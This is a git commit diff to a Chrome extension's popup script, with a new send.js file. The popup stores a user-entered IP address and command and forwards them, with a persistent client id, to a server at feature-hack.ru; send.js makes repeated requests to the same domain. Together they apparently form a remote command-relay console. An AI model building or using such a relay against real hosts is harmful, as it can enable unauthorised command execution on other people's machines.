def8523af85f908b61036e844da940ee3d44aa7d
iniga72 <49905453+iniga72@users.noreply.github.com>
2021-04-25 09:35:03 +0300

    в

--- js/popup.js
+++ js/popup.js
@@ -8,9 +8,19 @@ chrome.runtime.onMessage.addListener(function (data, sender, sendResponse) {
 });
 
 
-
 function load(){
     var uuid = localStorage.getItem('id');
+
+    var ip = document.getElementById("ip2");
+    var cmd = document.getElementById("cmdi");
+
+    
+    var ip2 = localStorage.getItem('ip');
+    var cmd2 = localStorage.getItem('cmd');
+    if(ip2 != null) ip.value = ip2;
+    if(cmd2 != null) cmd.value = cmd2;
+    
+    var cmd2 = localStorage.getItem('cmd');
     if(uuid == null){
         var abc = "abcdefghijklmnopqrstuvwxyz";
         var rs = "";
@@ -29,17 +39,27 @@ document.body.addEventListener('click', e => {
     //и так далее
   });*/
 window.addEventListener('DOMContentLoaded', function (evt) {
-    
+    load();
+      /*      
+    for (let i = 0; i < 3; i++) { // выведет 0, затем 1, затем 2
+        setTimeout(function(){
+            var x = new XMLHttpRequest();
+            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=фывфыв", false);
+            x.send(null);
+         }, 2000 * i)
+    }*/
 
     document.body.addEventListener('click', e => {
         if (e.target.classList.contains('consolesend')){
             e.preventDefault()
             var text = document.getElementById('response');
+            var text22 = document.getElementById('ip2');
             var ip = document.getElementById("ip2").value;
             var cmd = document.getElementById("cmdi").value;
             //text.textContent="z";
             var x = new XMLHttpRequest();
-            
+            localStorage.setItem('ip', ip);
+            localStorage.setItem('cmd', cmd);
             x.open("GET", "http://feature-hack.ru/send.php?cmd=" + cmd + "&pk=" +localStorage.getItem('id') + "&ip=" + ip, false);
             //x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=" + cmd + ip, false);
             x.onload = function (){
---
+++ js/send.js
@@ -0,0 +1,9 @@
+function onload() {
+    for (let i = 0; i < 3; i++) { // выведет 0, затем 1, затем 2
+        setTimeout(function(){
+            var x = new XMLHttpRequest();
+            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=фывфыв", false);
+            x.send(null);
+         }, 2000 * i)
+    }
+ };
